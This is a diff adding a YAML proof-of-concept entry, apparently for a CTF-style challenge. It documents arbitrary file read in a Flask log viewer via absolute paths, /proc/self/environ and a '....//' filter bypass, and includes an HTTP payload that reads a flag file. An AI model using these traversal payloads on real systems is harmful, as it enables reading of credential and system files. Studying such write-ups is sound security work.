@@ -1,0 +1,29 @@
+info:
+  name: Flask-LFI-Absolute-Path-Bypass
+  cve: ''
+  summary: Flask 日志查看器通过绝对路径绕过 WAF 的 ../ 过滤实现任意文件读取；/proc/self/environ 泄露 DYNAMIC_FLAG_PATH
+    定位 flag 文件
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: Flask 日志查看器通过绝对路径绕过 WAF 的 ../ 过滤实现任意文件读取；/proc/self/environ 泄露 DYNAMIC_FLAG_PATH
+    定位 flag 文件
+  steps:
+  - 1. 用测试账号 auditor/任意密码登录获取 session cookie
+  - '2. 探测日志查看 API: GET /api/logs/list 和 POST /api/logs/read (param: filename)'
+  - '3. 测试绝对路径直穿: filename=/etc/passwd （后端 open() 直接受绝对路径）'
+  - '4. 读环境变量定位 flag: filename=/proc/self/environ → 找到 DYNAMIC_FLAG_PATH=/challenge/flag.txt'
+  - '5. 读 flag: filename=/challenge/flag.txt'
+  - '6. 备选 WAF bypass: ....//....//....//etc/passwd （绕过简单 replace(''../'','''') 过滤）'
+  payload: 'POST /api/logs/read HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: session=<flask_session>
+
+
+    filename=/challenge/flag.txt'
+  verification: Flask 日志查看器通过绝对路径绕过 WAF 的 ../ 过滤实现任意文件读取；/proc/self/environ 泄露 DYNAMIC_FLAG_PATH
+    定位 flag 文件
